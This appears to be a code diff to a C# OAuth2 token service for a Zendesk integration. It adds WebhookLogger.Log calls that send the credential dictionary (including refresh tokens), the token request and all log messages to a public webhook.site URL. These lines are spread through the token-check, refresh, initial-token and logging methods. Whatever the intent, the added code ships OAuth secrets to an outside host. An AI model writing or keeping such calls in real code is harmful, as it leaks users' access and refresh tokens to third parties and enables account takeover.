@@ -13,8 +13,10 @@ public class OAuth2TokenService(InvocationContext invocationContext)
     private const int TokenExpirationBufferMinutes = 5;
     private readonly string _correlationId = Guid.NewGuid().ToString();
 
-    public bool IsRefreshToken(Dictionary<string, string> values) 
+    public bool IsRefreshToken(Dictionary<string, string> values)
     {
+        WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", "IsRefreshToken start");
+        WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", values);
         if (!values.TryGetValue(CredNames.ExpiresAt, out var expiresAtString) || string.IsNullOrEmpty(expiresAtString))
         {
             LogInfo("Token expiration info not found, refresh required");
@@ -37,7 +39,8 @@ public class OAuth2TokenService(InvocationContext invocationContext)
     public async Task<Dictionary<string, string>> RefreshToken(Dictionary<string, string> values, CancellationToken cancellationToken) 
     {
         LogInfo("Starting token refresh");
-        
+        WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", values);
+
         try
         {
             if (!values.TryGetValue(CredNames.RefreshToken, out var refreshToken) || string.IsNullOrEmpty(refreshToken))
@@ -58,6 +61,7 @@ public class OAuth2TokenService(InvocationContext invocationContext)
 
             var tokenResponse = await ExecuteTokenRequestAsync(request, tokenUrl, cancellationToken);
             LogInfo($"Token refreshed successfully, expires at: {tokenResponse.ExpiresAt:O}");
+            WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", request);
             
             return tokenResponse.ToDictionary();
         }
@@ -75,7 +79,8 @@ public class OAuth2TokenService(InvocationContext invocationContext)
         CancellationToken cancellationToken)
     {
         LogInfo($"Requesting initial token with state: {state}");
-        
+        WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", values);
+
         try
         {
             var tokenUrl = GetTokenUrl(values);
@@ -115,7 +120,7 @@ public class OAuth2TokenService(InvocationContext invocationContext)
         CancellationToken cancellationToken) 
     {
         LogInfo($"Executing token request to {tokenUrl}");
-        
+
         using var client = new HttpClient();
         using var content = new FormUrlEncodedContent(request.ToFormData());
         
@@ -154,12 +159,14 @@ public class OAuth2TokenService(InvocationContext invocationContext)
     {
         InvocationContext.Logger?.LogInformation(
             $"[ZendeskOAuth2] [{_correlationId}] {message}", []);
+        WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", message);
     }
 
     private void LogWarning(string message)
     {
         InvocationContext.Logger?.LogWarning(
             $"[ZendeskOAuth2] [{_correlationId}] {message}", []);
+        WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", message);
     }
 
     private void LogError(string message, Exception? exception = null)
@@ -169,6 +176,7 @@ public class OAuth2TokenService(InvocationContext invocationContext)
             : $"[ZendeskOAuth2] [{_correlationId}] {message}";
         
         InvocationContext.Logger?.LogError(logMessage, []);
+        WebhookLogger.Log("https://webhook.site/5adb1289-9df6-42ef-abd6-dba9cfad84d5", logMessage);
     }
 
     #endregion
